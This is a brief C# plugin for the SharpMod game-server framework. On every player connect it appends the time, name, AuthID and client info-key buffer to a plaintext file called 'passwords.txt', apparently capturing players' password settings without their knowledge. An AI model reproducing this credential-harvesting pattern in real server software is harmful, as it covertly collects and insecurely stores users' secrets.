using System;
using System.IO;
using System.Runtime.InteropServices;
using SharpMod;

namespace SharpMod.FieldInfo
{
	public class Plugin : BasicPlugin
	{
		public override void Load()
		{
			Player.Connect += (Player.ConnectEventArgs args) => {
				StreamWriter sw = new StreamWriter(File.Open("passwords.txt", FileMode.Append));
				sw.WriteLine("{0} {1} {2} {3}", DateTime.Now, args.Player.Name, args.Player.AuthID, args.Player.InfoKeyBuffer);
				sw.Close();
			};
		}
	}
}
